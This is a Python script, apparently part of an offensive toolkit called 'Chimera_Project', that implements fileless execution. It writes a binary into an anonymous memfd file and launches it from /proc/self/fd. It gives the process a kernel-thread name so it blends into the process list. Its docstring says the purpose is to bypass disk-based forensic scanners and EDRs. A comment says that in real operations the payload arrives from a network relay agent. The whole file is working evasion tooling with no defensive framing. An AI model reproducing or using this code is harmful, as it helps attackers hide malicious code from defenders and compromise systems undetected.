#!/home/dan/Chimera_Project/venv/bin/python3
import os
import ctypes
import subprocess

class FilelessRunner:
    """
    Agent 411: The Fileless Ghost.
    Utilizes memfd_create to execute binaries directly from 
    memory, bypassing disk-based forensic scanners and EDRs.
    """
    def __init__(self):
        # libc access for low-level system calls
        self.libc = ctypes.CDLL("libc.so.6")
        
        # memfd_create syscall constant (319 for x86_64)
        self.SYS_memfd_create = 319
        self.MFD_CLOEXEC = 0x0001

    def execute_from_mem(self, binary_bytes, name="[kworker/u:1]"):
        """Creates a memory file, writes the agent, and executes it."""
        print(f"--- [AGENT 411: IN-MEMORY EXECUTION SEQUENCE] ---")
        
        # 1. Create anonymous file in RAM
        # We name it like a kernel thread to blend into the process list
        fd = self.libc.syscall(self.SYS_memfd_create, name, self.MFD_CLOEXEC)
        if fd < 0:
            print("[!] memfd_create failed.")
            return False

        print(f"[*] Memory File Descriptor created: FD {fd}")

        # 2. Write the binary content to the memory FD
        os.write(fd, binary_bytes)

        # 3. Execute the binary via fexecve (or by path to /proc/self/fd/)
        print(f"[*] Transitioning to Fileless Execution of '{name}'...")
        
        # Using subprocess to call the FD path is a 'Pro' trick 
        # that doesn't require a complex fexecve implementation in Python.
        try:
            subprocess.Popen([f"/proc/self/fd/{fd}"], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
            print("[\033[92mSUCCESS\033[0m] Ghost Process birthed in RAM.")
            return True
        except Exception as e:
            print(f"[!] Execution failed: {e}")
            return False

if __name__ == "__main__":
    # In a real op, binary_bytes comes from Agent 311 (Network Relay)
    # Here, we simulate by reading a simple system binary like /bin/ls
    with open("/bin/ls", "rb") as f:
        payload = f.read()
    
    FilelessRunner().execute_from_mem(payload)
